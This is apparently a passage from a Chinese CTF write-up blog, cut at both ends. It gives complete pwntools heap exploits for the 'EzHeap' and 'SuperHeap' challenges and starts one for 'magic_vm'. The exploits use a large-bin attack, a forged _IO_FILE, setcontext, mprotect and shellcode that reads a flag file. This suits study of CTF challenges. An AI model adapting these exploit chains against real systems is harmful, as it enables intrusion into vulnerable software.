class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">l,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(l).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>,data);<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx&quot;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode())<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&quot;EzHeap&quot;)</span><br>p=remote(<span class="hljs-string">&quot;8.147.134.47&quot;</span>,<span class="hljs-string">&quot;35955&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp setcontext+0x3d&#x27;)</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x448</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27;rotwilll&#x27;</span>)<br>large=u64(p.readuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(large))<br>pause()<br>libc.address=large-<span class="hljs-number">0x21b0e0</span><br>stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>iolist=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>success(<span class="hljs-string">f&quot;libcaddr=0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&quot;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+p64(<span class="hljs-number">0x451</span>)+p64(large)*<span class="hljs-number">2</span>+p64(iolist-<span class="hljs-number">0x20</span>)*<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27;rotwilll&#x27;</span>)<br>chunk=u64(p.readuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(chunk))<br><br>fake_io_add=chunk<br>chunk1=chunk-<span class="hljs-number">0x300</span><br>gs=chunk1<br>shelladd=chunk1+<span class="hljs-number">0x200</span><br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,chunk,<span class="hljs-number">0x300</span>)+shellcraft.write(<span class="hljs-number">1</span>,chunk,<span class="hljs-number">0x300</span>)<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>setcontext=libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x167420</span><br><br>fake_io=flat(&#123;<br>    <span class="hljs-number">0x28</span>: [gs,<span class="hljs-number">1</span>],<br>    <span class="hljs-number">0x98</span>: fake_io_add+<span class="hljs-number">0x28</span>,<br><span class="hljs-number">0xa0</span>: fake_io_add,<br><span class="hljs-number">0xd8</span>: wfile_jump+<span class="hljs-number">0x30</span>,<br>&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>gsdata=flat(&#123;<br><span class="hljs-number">8</span>: [gs,shelladd],<br>    <span class="hljs-number">0x20</span>: setcontext+<span class="hljs-number">0x3d</span>,<br><span class="hljs-number">0x28</span>: gadget,<br><span class="hljs-number">0x68</span>: gs&amp;(~<span class="hljs-number">0xfff</span>), <br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>, <br><span class="hljs-number">0x88</span>: <span class="hljs-number">7</span>, <br><span class="hljs-number">0xa0</span>: gs+<span class="hljs-number">0x10</span>, <br><span class="hljs-number">0xa8</span>: mprotect, <br><span class="hljs-number">0xe0</span>: gs<br>&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload=gsdata<br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=asm(shellcode)<br>payload=payload.ljust(<span class="hljs-number">0x300</span>)<br>payload=payload+fake_io<br><br>edit(<span class="hljs-number">2</span>,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="SuperHeap">SuperHeap</h2><p>和EzHeap一样，稍微的难点就是go不好逆而且使用了protobuf<br>比赛的时候没认真看，复现才做出来，太可惜了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">import</span> protobuf<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Title</span>(<span class="hljs-params">t=<span class="hljs-string">b&#x27;t&#x27;</span></span>):<br>    t=base64.b64encode(t)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(t))+t<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Auther</span>(<span class="hljs-params">a=<span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>    a=base64.b64encode(a)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x12&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(a))+a<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Isbn</span>(<span class="hljs-params">i=<span class="hljs-string">b&#x27;i&#x27;</span></span>):<br>    i=base64.b64encode(i)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x1a&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(i))+i<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Date</span>(<span class="hljs-params">d=<span class="hljs-string">b&#x27;d&#x27;</span></span>):<br>    d=base64.b64encode(d)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x22&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Price</span>(<span class="hljs-params">d=<span class="hljs-number">1.1</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x29&#x27;</span>+struct.pack(<span class="hljs-string">&#x27;d&#x27;</span>,d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Stock</span>(<span class="hljs-params">s=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x30&#x27;</span>+varint.encode(s)<br><br>funcs=&#123;<br>    <span class="hljs-string">&quot;t&quot;</span>:Title,<br>    <span class="hljs-string">&quot;a&quot;</span>:Auther,<br>    <span class="hljs-string">&quot;i&quot;</span>:Isbn,<br>    <span class="hljs-string">&quot;d&quot;</span>:Date,<br>    <span class="hljs-string">&quot;p&quot;</span>:Price,<br>    <span class="hljs-string">&quot;s&quot;</span>:Stock&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">selectfunc</span>(<span class="hljs-params">func</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">select</span>(<span class="hljs-params">*args,**kargs</span>):<br>        n=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> funcs:<br>            <span class="hljs-keyword">if</span> kargs.get(i)==<span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">if</span> n&lt;<span class="hljs-built_in">len</span>(args):<br>                    kargs[i]=(args[n],)<br>                    n+=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    kargs[i]=<span class="hljs-built_in">tuple</span>()<br>            <span class="hljs-keyword">else</span>:<br>                kargs[i]=(kargs[i],)<br>        <span class="hljs-keyword">return</span> func(**kargs)<br>    <span class="hljs-keyword">return</span> select<br><br><span class="hljs-meta">@selectfunc</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makepayload</span>(<span class="hljs-params">**kargs</span>):<br>    payload=<span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> kargs.items():<br>        payload+=funcs[i](*v)<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,**kargs</span>):<br>    payload=makepayload(**kargs)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Data:&#x27;</span>,base64.b32encode(payload))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind,**kargs</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind,**kargs</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,**kargs</span>):<br>    payload=makepayload(**kargs)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Data:&#x27;</span>,base64.b32encode(<span class="hljs-built_in">bytes</span>(payload)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">key,**kargs</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Keyword:&#x27;</span>,key)<br>p=process(<span class="hljs-string">&quot;./SuperHeap&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0</span>,t=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x438</span>)<br>add(<span class="hljs-number">1</span>,t=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x428</span>) <span class="hljs-comment">#441</span><br>add(<span class="hljs-number">2</span>,t=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x438</span>)<br>add(<span class="hljs-number">3</span>,t=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x438</span>) <span class="hljs-comment">#451</span><br>add(<span class="hljs-number">4</span>,t=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x438</span>)<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">5</span>,t=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>)<br><br>edit(<span class="hljs-number">2</span>,t=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x448</span>+<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>large=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=large-<span class="hljs-number">0x21ace0</span>-<span class="hljs-number">0x400</span><br>iolist=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>success(<span class="hljs-string">f&quot;libc.address=0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&quot;</span>)<br><br><br>edit(<span class="hljs-number">2</span>,t=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x448</span>+p64(<span class="hljs-number">0x451</span>)+p64(large)*<span class="hljs-number">2</span>+p64(iolist-<span class="hljs-number">0x20</span>)*<span class="hljs-number">2</span>)<br><br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">6</span>,t=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>)<br><br>edit(<span class="hljs-number">2</span>,t=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x448</span>+<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br>p.readuntil(<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>chunk=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(chunk))<br><br>fake_io_add=chunk<br>chunk1=chunk-<span class="hljs-number">0x440</span><br>gs=chunk1<br>shelladd=chunk1+<span class="hljs-number">0x200</span><br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,chunk,<span class="hljs-number">0x300</span>)+shellcraft.write(<span class="hljs-number">1</span>,chunk,<span class="hljs-number">0x300</span>)<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>setcontext=libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x167420</span><br><br>fake_io=flat(&#123;<br>    <span class="hljs-number">0x28</span>: [gs,<span class="hljs-number">1</span>],<br>    <span class="hljs-number">0x98</span>: fake_io_add+<span class="hljs-number">0x28</span>,<br><span class="hljs-number">0xa0</span>: fake_io_add,<br><span class="hljs-number">0xd8</span>: wfile_jump+<span class="hljs-number">0x30</span>,<br>&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>gsdata=flat(&#123;<br><span class="hljs-number">8</span>: [gs,shelladd],<br>    <span class="hljs-number">0x20</span>: setcontext+<span class="hljs-number">0x3d</span>,<br><span class="hljs-number">0x28</span>: gadget,<br><span class="hljs-number">0x68</span>: gs&amp;(~<span class="hljs-number">0xfff</span>),<br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>,<br><span class="hljs-number">0x88</span>: <span class="hljs-number">7</span>,<br><span class="hljs-number">0xa0</span>: gs+<span class="hljs-number">0x10</span>, <br><span class="hljs-number">0xa8</span>: mprotect,<br><span class="hljs-number">0xe0</span>: gs<br>&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload=gsdata<br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=asm(shellcode)<br>payload=payload.ljust(<span class="hljs-number">0x440</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload=payload+fake_io<br>edit(<span class="hljs-number">0</span>,t=payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="magic-vm">magic_vm</h2><p>程序执行code分为三步</p><ol><li>解析</li><li>执行</li><li>赋值</li></ol><p>假设存在三条指令 <code>a,b,c</code></p><ul><li>在解析<code>a,b,c</code>时环境为初始环境</li><li>在执行<code>a,b</code>时环境为初始环境</li><li>在执行<code>c</code>时环境为执行a之后的环境</li></ul><p>利用这一点可以绕过解析时的<code>check_addr</code>函数<br>只要在解析<code>c</code>时目标寄存器的值没有超过限制，而执行c时超过了限制就可以实现数组越界导致的读写<br>由于指令执行时数据所在页和<code>ld.so</code>中间没有不存在的地址,所以几乎可以说指令执行时数据所在页的地址与<code>ld.so</code>的偏移是不变的</p><p>比赛时想到了这个漏洞，但不知道为什么测试的时候有点问题没有证实我的想法<br>赛后复现的时候证实了这个想法，可能是比赛时思想有点死板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>ops=&#123;<br>    <span class="hljs-string">&quot;add&quot;</span>:(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>),<br>    <span class="hljs-string">&quot;sub&quot;</span>:(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>),<br>    <span class="hljs-string">&quot;sal&quot;</span>:(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>),<br>    <span class="hljs-string">&quot;sar&quot;</span>:(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>),<br>    <span class="hljs-string">&quot;mov&quot;</span>:(<span class="hljs-number">5</span>,<span class="hljs-number">2</span>),<br>    <span class="hljs-string">&quot;and&quot;</span>:(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>),<br>    <span class="hljs-string">&quot;or&quot;</span>:(<span class="hljs-number">7</span>,<span class="hljs-number">2</span>),<br>    <span class="hljs-string">&quot;xor&quot;</span>:(<span class="hljs-number">8</span>,<span class="hljs-number">2</span>),<br>    <span class="hljs-string">&quot;push&quot;</span>:(<span class="hljs-number">10</span>,<span class="hljs-number">1</span>),<br>    <span class="hljs-string">&quot;pop&quot;</span>:(<span class="hljs-number">9</span>,<span class="hljs-number">1</span>),<br>    <span class="hljs-string">&quot;nop&quot;</span>:(<span class="hljs-number">11</span>,<span class="hljs-number">0</span>)&#125;<br><br>regs=&#123;<span class="hljs-string">&quot;rax&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;rbx&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;rcx&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;rdx&quot;</span>:<span class="hljs-number">3</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOp</span>(<span class="hljs-params">op</span>):<br>    <span class="hljs-keyword">return</span> ops[op]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_oper</span>(<span class="hljs-params">reg</span>):<br>    <span class="hljs-keyword">if</span> reg.startswith(<span class="hljs-string">&quot;[&quot;</span>):<br>        reg=reg[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>].strip()<br>        optype=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">else</span>:<br>        optype=<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> regs.get(reg)!=<span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> optype==<span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> regs.get(reg)==<span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> (optype,<span class="hljs-built_in">int</span>(reg)&amp;<span class="hljs-number">0xff</span>,p8)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> (optype,regs.get(reg),p8)<br>    optype=<span class="hljs-number">1</span><br>    scope=<span class="hljs-number">0xffffffffffffffff</span><br>    <span class="hljs-keyword">if</span> reg.startswith(<span class="hljs-string">&#x27;@&#x27;</span>):<br>        optype=<span class="hljs-number">2</span><br>        scope=<span class="hljs-number">0xff</span><br>        reg=reg[<span class="hljs-number">1</span>:]<br>    <span class="hljs-keyword">if</span> reg.startswith(<span class="hljs-string">&quot;0x&quot;</span>):<br>        <span class="hljs-keyword">return</span> (optype,<span class="hljs-built_in">eval</span>(reg)&amp;scope,p64)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> (optype,<span class="hljs-built_in">eval</span>(reg)&amp;scope,p64)<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">code</span>):<br>    codelines=code.splitlines()<br>    codes=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> codelines:<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;#&#x27;</span> <span class="hljs-keyword">in</span> i:<br>            sharp=i.find(<span class="hljs-string">&#x27;#&#x27;</span>)<br>            i=i[:sharp]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i.strip())==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;;&#x27;</span> <span class="hljs-keyword">in</span> i:<br>            c=i.split(<span class="hljs-string">&#x27;;&#x27;</span>)<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> c:<br>                codes.append(j.strip())<br>        <span class="hljs-keyword">else</span>:<br>            codes.append(i.strip())<br>                <br>    result=<span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> codes:<br>        opcode=<span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> i <span 